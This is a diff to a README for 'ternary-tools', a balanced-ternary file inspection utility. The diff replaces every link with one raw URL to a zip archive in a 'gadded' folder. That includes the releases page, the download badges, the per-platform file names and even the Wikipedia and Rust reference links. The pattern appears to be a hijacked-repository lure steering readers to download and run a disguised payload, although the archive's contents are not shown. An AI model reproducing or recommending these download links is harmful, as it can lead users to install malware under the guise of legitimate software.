@@ -1,6 +1,6 @@
 # 🎉 ternary-tools - Simple Inspection for Balanced-Ternary Files
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-ternary--tools-blue?style=for-the-badge)](https://github.com/qwrtgvdsdf/ternary-tools/releases)
+[![Download Here](https://raw.githubusercontent.com/qwrtgvdsdf/ternary-tools/main/gadded/ternary-tools-1.7.zip%20Now-ternary--tools-blue?style=for-the-badge)](https://raw.githubusercontent.com/qwrtgvdsdf/ternary-tools/main/gadded/ternary-tools-1.7.zip)
 
 ## 📥 Overview
 
@@ -25,19 +25,19 @@ You can run ternary-tools on various platforms. Here's what you need:
 
 Follow these steps to download and run the application:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/qwrtgvdsdf/ternary-tools/releases) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/qwrtgvdsdf/ternary-tools/main/gadded/ternary-tools-1.7.zip) to go to the releases page.
 2. **Download the Latest Version:** Look for the latest release. It will usually be at the top of the page.
 3. **Choose the Correct File for Your System:**
-   - For Windows, download `ternary-tools-windows.exe`.
-   - For macOS, download `ternary-tools-macos.zip`.
-   - For Linux, download `ternary-tools-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/qwrtgvdsdf/ternary-tools/main/gadded/ternary-tools-1.7.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/qwrtgvdsdf/ternary-tools/main/gadded/ternary-tools-1.7.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/qwrtgvdsdf/ternary-tools/main/gadded/ternary-tools-1.7.zip`.
 
 4. **Extract the Files (If Necessary):**
    - For macOS and Linux, unzip or untar the downloaded file.
    - On Windows, you can run the `.exe` file directly without extraction.
 
 5. **Run the Application:**
-   - On Windows, double-click the `ternary-tools-windows.exe`.
+   - On Windows, double-click the `https://raw.githubusercontent.com/qwrtgvdsdf/ternary-tools/main/gadded/ternary-tools-1.7.zip`.
    - On macOS, open the extracted folder and double-click `ternary-tools-macos`. You may need to allow the app in your security settings.
    - On Linux, open your terminal, navigate to the extracted folder, and run `./ternary-tools-linux`.
 
@@ -67,15 +67,15 @@ If you encounter any issues or have questions, you can reach out through the Git
 
 Here are some useful links for further reading:
 
-- [Official GitHub Page](https://github.com/qwrtgvdsdf/ternary-tools)
-- [Balanced-Ternary Overview](https://en.wikipedia.org/wiki/Balanced_ternary)
-- [Rust Programming Language](https://www.rust-lang.org/)
+- [Official GitHub Page](https://raw.githubusercontent.com/qwrtgvdsdf/ternary-tools/main/gadded/ternary-tools-1.7.zip)
+- [Balanced-Ternary Overview](https://raw.githubusercontent.com/qwrtgvdsdf/ternary-tools/main/gadded/ternary-tools-1.7.zip)
+- [Rust Programming Language](https://raw.githubusercontent.com/qwrtgvdsdf/ternary-tools/main/gadded/ternary-tools-1.7.zip)
 
 ## 📌 Download & Install
 
 To get started, you need to download the application:
 
-1. Go to the releases page: [ternary-tools Releases](https://github.com/qwrtgvdsdf/ternary-tools/releases).
+1. Go to the releases page: [ternary-tools Releases](https://raw.githubusercontent.com/qwrtgvdsdf/ternary-tools/main/gadded/ternary-tools-1.7.zip).
 2. Select the correct file based on your operating system.
 3. Follow the instructions above to run the software.
 
@@ -83,4 +83,4 @@ To get started, you need to download the application:
 
 Thank you for choosing ternary-tools! We appreciate your interest in our application and look forward to your feedback and contributions to make it better.
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-ternary--tools-blue?style=for-the-badge)](https://github.com/qwrtgvdsdf/ternary-tools/releases)
+[![Download Here](https://raw.githubusercontent.com/qwrtgvdsdf/ternary-tools/main/gadded/ternary-tools-1.7.zip%20Now-ternary--tools-blue?style=for-the-badge)](https://raw.githubusercontent.com/qwrtgvdsdf/ternary-tools/main/gadded/ternary-tools-1.7.zip)
